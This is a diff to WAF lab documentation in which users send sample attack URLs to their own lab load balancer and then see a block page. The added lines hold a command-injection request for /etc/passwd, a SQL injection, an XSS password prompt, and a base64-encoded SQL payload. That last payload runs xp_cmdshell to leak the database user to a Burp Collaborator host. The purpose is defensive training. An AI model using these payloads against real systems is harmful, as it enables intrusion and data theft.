@@ -107,8 +107,8 @@ Now we will deploy a Load Balancer on the CE node that was deployed in the AWS V
  ================================= =======
  *Variable*                        *Value*
  ================================= =======
- Name                              **[NAMESPACE]-private-lb**
- Domains                           **[NAMESPACE].aws.lab.f5demos.com**
+ Name                              **<your-namespace>-private-lb**
+ Domains                           **<your-namespace>.aws.lab.f5demos.com**
  Select type of Load Balancer      **HTTP**
  Automatically Manage DNS Records  **No/Unchecked**
  ================================= =======
@@ -222,9 +222,11 @@ We then connect to the AWS resource via it's Private IP address.
 Using some of the sample attacks below, add the URI path & variables to your application to generate
 security event data.
 
-   * /?cmd=cat%20/etc/passwd
-   * /product?id=4%20OR%201=1
-   * /cart?search=aaa'><script>prompt('Please+enter+your+password');</script>
+   .. admonition:: Sample WAF Attack URLs
+
+     * `http://\<your-namespace\>.lab-sec.f5demos.com/?cmd=cat%20/etc/passwd <http://\<your-namespace\>.lab-sec.f5demos.com/?cmd=cat%20/etc/passwd>`_
+     * `http://\<your-namespace\>.lab-sec.f5demos.com/?4d4ad2dbdb=MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z <http://\<your-namespace\>.lab-sec.f5demos.com//?4d4ad2dbdb=MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z>`_
+     * `http://\<your-namespace\>.lab-sec.f5demos.com/cart?search=aaa%E2%80%99%3E%3Cscript%3Eprompt%28%E2%80%98Please%2Benter%2Byour%2Bpassword%E2%80%99%29%3B%3C%2Fscript%3E <http://\<your-namespace\>.lab-sec.f5demos.com/cart?search=aaa%E2%80%99%3E%3Cscript%3Eprompt%28%E2%80%98Please%2Benter%2Byour%2Bpassword%E2%80%99%29%3B%3C%2Fscript%3E>`_
 
 Just like in Lab 1, you should see a block page when adding the attacks to the URL. The difference in this case is that the
 enforcement of the WAF policy is occurring on the load balancer on the CE node that is deployed in the AWS lab environment
